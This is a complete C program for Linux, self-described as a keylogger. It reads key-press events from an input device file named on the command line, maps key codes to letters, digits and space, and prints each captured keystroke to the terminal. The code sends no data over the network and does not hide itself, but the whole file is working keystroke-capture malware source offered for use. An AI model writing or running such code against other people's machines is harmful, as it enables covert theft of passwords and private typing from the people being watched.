#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <linux/input.h>
#include <string.h>

struct key_mapping{
    int code;
    char* key;
};

struct key_mapping keymap[] = {
    {KEY_1, "1"}, {KEY_2, "2"}, {KEY_3, "3"}, {KEY_4, "4"},
    {KEY_5, "5"}, {KEY_6, "6"}, {KEY_7, "7"}, {KEY_8, "8"},
    {KEY_9, "9"}, {KEY_0, "0"},
    {KEY_A, "A"}, {KEY_B, "B"}, {KEY_C, "C"}, {KEY_D, "D"},
    {KEY_E, "E"}, {KEY_F, "F"}, {KEY_G, "G"}, {KEY_H, "H"},
    {KEY_I, "I"}, {KEY_J, "J"}, {KEY_K, "K"}, {KEY_L, "L"},
    {KEY_M, "M"}, {KEY_N, "N"}, {KEY_O, "O"}, {KEY_P, "P"},
    {KEY_Q, "Q"}, {KEY_R, "R"}, {KEY_S, "S"}, {KEY_T, "T"},
    {KEY_U, "U"}, {KEY_V, "V"}, {KEY_W, "W"}, {KEY_X, "X"},
    {KEY_Y, "Y"}, {KEY_Z, "Z"},
    {KEY_SPACE, " "},
    {0, NULL}
};

char* get_key_name(int code){
    for(int i=0; keymap[i].code != 0; i++){
        if(keymap[i].code == code){
            return keymap[i].key;
        }
    }
    return NULL;
}

int main(int argc, char *argv[]){
    if(argc != 2){
        printf("usage: %s <event-file>\n", argv[0]);
        exit(-1);
    }
    printf("keylogger active ...\n");


    int fd = open(argv[1], O_RDONLY);
    if(fd < 0){
        perror("open");
        exit(-1);
    }
    printf("opened fd: %d\n", fd);
    struct input_event ie;
    while(1){
        read(fd, &ie, sizeof(ie));
        if (ie.type != EV_KEY || ie.value != 1) continue;
        
        char* keyname = get_key_name(ie.code);
        if(keyname){
            printf("%s", keyname);
        }else{
            printf("[?%d]", ie.code);
        }
        fflush(stdout);
    }
    close(fd);
    return 0;
}
